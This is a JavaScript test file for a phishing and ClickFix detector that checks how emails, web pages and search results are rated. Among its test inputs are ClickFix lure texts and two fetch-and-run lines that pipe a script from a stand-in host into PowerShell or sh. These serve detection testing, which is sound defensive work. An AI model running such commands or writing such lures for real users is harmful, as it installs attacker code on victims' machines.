import test from "node:test";
import assert from "node:assert/strict";
import { decideRisk } from "../src/core/decision-engine.js";
import { extractTextSignals } from "../src/core/text-signals.js";
import { analyzeEmail } from "../src/email/email-analyzer.js";
import { analyzeClickFix } from "../src/web/clickfix-analyzer.js";
import { analyzePageSnapshot, analyzeSearchResult } from "../src/web/page-analyzer.js";

test("unrelated link deception and an ordinary password form do not converge into red", () => {
  const result = analyzePageSnapshot({
    title: "Community portal",
    text: "Sign in to review your account. Public link comparison is shown in a separate article.",
    forms: [{ action: "/login", hasPassword: true, hasCredentialField: true }],
    links: [{ href: "https://outside.test/article", visibleText: "https://reference.test", contextText: "Comparison of links in an article." }]
  }, "https://portal.example.test");
  assert.equal(result.decision.state, "YELLOW");
});

test("credential text is not correlated with an unrelated link in a multi-link message", () => {
  const result = analyzeEmail({
    senderName: "Operations", senderAddress: "ops@example.test",
    bodyText: "Sign in to review your account. Our public reference links appear in the footer.",
    links: [
      { href: "https://example.test/account", visibleText: "Account", contextText: "Sign in to review your account." },
      { href: "https://outside.test/article", visibleText: "https://reference.test", contextText: "Public reference links." }
    ]
  });
  assert.equal(result.decision.state, "YELLOW");
});

test("findings deduplicate by rule, scope and sanitized evidence", () => {
  const signal = { id: "URL_SENSITIVE_PARAMETER", category: "link", severity: 2, scope: "link:0", location: "link" };
  const result = decideRisk({ signals: [signal, { ...signal }], coverage: { sufficient: true } });
  assert.equal(result.findings.length, 1);
});

test("password, invoice, free and unsubscribe mentions alone remain context", () => {
  const result = analyzeEmail({ senderAddress: "support@example.test", subject: "Invoice documentation", bodyText: "Our password documentation describes MFA. The free documentation includes invoice examples. Unsubscribe." });
  assert.equal(result.decision.state, "GREEN");
  assert.ok(extractTextSignals("Do not share your password with anyone.").every((signal) => signal.severity === 0));
});

test("a security report about brands and passwords does not become impersonation", () => {
  const result = analyzePageSnapshot({ title: "Security research", text: "Microsoft and Google password documentation: this article compares authentication standards and describes security research.", forms: [], links: [] }, "https://research.example.test");
  assert.equal(result.decision.state, "GREEN");
});

test("ClickFix can join adjacent rendered instruction blocks without vacuous suppression", () => {
  const text = "Verify you are human.\n\nOpen Windows + R.\n\nPaste the PowerShell command and press Enter.";
  assert.equal(analyzeClickFix(text).detected, true);
});

test("an educational claim does not excuse an operative execution instruction", () => {
  const text = "Educational demonstration. Do not run suspicious commands. To verify you are human, open Windows + R, paste powershell and press Enter now.";
  assert.equal(analyzeClickFix(text).detected, true);
});

test("quoted attack examples with an explicit warning remain reports", () => {
  const text = 'Attack example: "Verify you are human, open Windows + R, paste powershell and press Enter." Do not execute these instructions.';
  assert.equal(analyzeClickFix(text).detected, false);
});

test("deceptive remote execution repair patterns are recognized in Portuguese and English", () => {
  for (const text of [
    "Para corrigir o erro do navegador, abra o terminal, cole powershell -c iwr https://payload.test/run.ps1 | iex e pressione Enter.",
    "To fix the browser error, open Terminal, paste curl https://payload.test/run.sh | sh and press Enter."
  ]) assert.equal(analyzeClickFix(text).detected, true, text);
  assert.equal(analyzeClickFix("Open PowerShell, paste the signed diagnostic command and press Enter to repair access.").detected, false);
});

test("decision explicitly separates completed observation from missing coverage and failure", () => {
  assert.equal(decideRisk({ coverage: { sufficient: true } }).analysisStatus, "completed");
  assert.equal(decideRisk({ coverage: { sufficient: false } }).analysisStatus, "insufficient");
  assert.equal(decideRisk({ analysisError: true }).analysisStatus, "failure");
});

test("configured SSO destination reduces cross-domain uncertainty without granting trust to HTTP or lookalikes", () => {
  const snapshot = { title: "Company portal", text: "Company account authentication is available here.", forms: [{ action: "https://login.company-sso.test/session", hasPassword: true, hasCredentialField: true }], links: [] };
  const knowledgeBase = { ssoDomains: ["login.company-sso.test"] };
  const known = analyzePageSnapshot(snapshot, "https://portal.company.test", knowledgeBase);
  assert.equal(known.decision.state, "YELLOW");
  assert.ok(known.signals.some((signal) => signal.id === "CREDENTIAL_FORM_CROSS_DOMAIN" && signal.severity === 2));
  const unconfigured = analyzePageSnapshot(snapshot, "https://portal.company.test");
  assert.equal(unconfigured.decision.state, "RED");
  const insecure = analyzePageSnapshot({ ...snapshot, forms: [{ ...snapshot.forms[0], action: "http://login.company-sso.test/session" }] }, "https://portal.company.test", knowledgeBase);
  assert.equal(insecure.decision.state, "RED");
});

test("matching deceptive link and active credential action still converge locally", () => {
  const result = analyzePageSnapshot({ title: "Notice", text: "Review the notice and reference links below.", forms: [], links: [{ href: "https://collector.test/login", visibleText: "https://accounts.reference.test", contextText: "Enter your password to confirm your account." }] }, "https://notice.example.test");
  assert.equal(result.decision.state, "RED");
  assert.equal(result.decision.riskCategory, "phishing");
  assert.ok(result.decision.findings.some((finding) => finding.scope === "link:0"));
});

test("truncated page snapshots never imply complete coverage", () => {
  const result = analyzePageSnapshot({ title: "Long reference page", text: "A neutral paragraph. ".repeat(1400), forms: [], links: [] }, "https://example.test");
  assert.equal(result.decision.state, "UNKNOWN");
  assert.equal(result.decision.analysisStatus, "insufficient");
});

test("unquoted incident narratives require a specific warning about the reproduced instructions", () => {
  for (const text of [
    "Incident report: Verify you are human, open Windows + R, paste powershell and press Enter. Do not run these commands.",
    "Exemplo de ataque: Para verificar que você é humano, pressione Windows + R, cole PowerShell e pressione Enter. Nunca execute comandos desse tipo."
  ]) assert.equal(analyzeClickFix(text).detected, false, text);
  const separateAttack = "Incident report: Verify you are human, open Windows + R, paste powershell and press Enter. Do not run these commands.\n\nTo verify you are human now, open Windows + R, paste powershell and press Enter.";
  assert.equal(analyzeClickFix(separateAttack).detected, true);
});

test("web and search pipelines preserve the boundary before an incident narrative", () => {
  const text = "Incident report: Verify you are human, open Windows + R, paste powershell and press Enter. Do not run these commands.";
  const page = analyzePageSnapshot({ title: "Security analysis", text, forms: [], links: [] }, "https://research.example.test");
  const search = analyzeSearchResult({ href: "https://research.example.test/report", title: "Security analysis", snippet: text });
  for (const result of [page, search]) {
    assert.notEqual(result.decision.state, "RED");
    assert.equal(result.signals.some((signal) => signal.id === "CLICKFIX_EXECUTION_INSTRUCTIONS"), false);
  }
  const operative = analyzeSearchResult({ href: "https://verification.example.test", title: "Human verification", snippet: "Open Windows + R, paste powershell and press Enter." });
  assert.equal(operative.decision.state, "RED");
});
